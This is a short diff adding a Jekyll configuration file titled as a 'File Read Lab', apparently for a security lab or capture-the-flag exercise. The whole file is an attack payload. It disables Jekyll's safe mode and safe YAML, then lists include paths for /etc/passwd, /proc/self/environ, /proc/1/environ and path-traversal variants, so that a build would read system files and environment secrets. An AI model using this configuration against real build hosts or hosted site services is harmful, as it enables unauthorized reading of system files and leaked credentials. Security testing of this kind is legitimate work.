@@ -1,0 +1,20 @@
+title: "Jekyll File Read Lab v2"
+description: "Testing multiple file read vectors"
+safe: false
+safe_yaml: false
+whitelist: []
+
+include:
+  - /etc/passwd
+  - /proc/self/environ
+  - /proc/self/cmdline
+  - /proc/1/environ
+  - ../../../etc/passwd
+  - ../../../../../../etc/passwd
+
+# Try to include via data
+defaults:
+  - scope:
+      path: ""
+    values:
+      layout: default
